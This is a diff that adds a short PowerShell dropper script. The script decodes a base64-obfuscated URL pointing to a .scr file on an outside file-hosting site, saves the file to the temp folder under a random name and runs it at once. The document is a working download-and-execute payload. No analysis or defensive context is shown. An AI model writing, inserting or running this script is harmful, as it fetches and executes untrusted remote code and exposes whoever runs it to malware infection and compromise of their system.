@@ -1,0 +1,11 @@
+$u = "aHR0cHM6Ly9iaXRlYmxvYi5jb20vRG93bmxvYWQvY3l4blR5QXp2QXd5TVovY3MxMzcuc2Ny"  # base64-encoded URL to the .scr file
+$d = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($u))
+
+# Generate random filename (e.g., Ab12XYz9.scr)
+$r = -join ((48..57 + 65..90 + 97..122) | Get-Random -Count 8 | ForEach-Object { [char]$_ })
+$f = "$r.scr"
+$p = [IO.Path]::Combine([IO.Path]::GetTempPath(), $f)
+
+# Download and execute
+(New-Object Net.WebClient).DownloadFile($d, $p)
+Start-Process $p
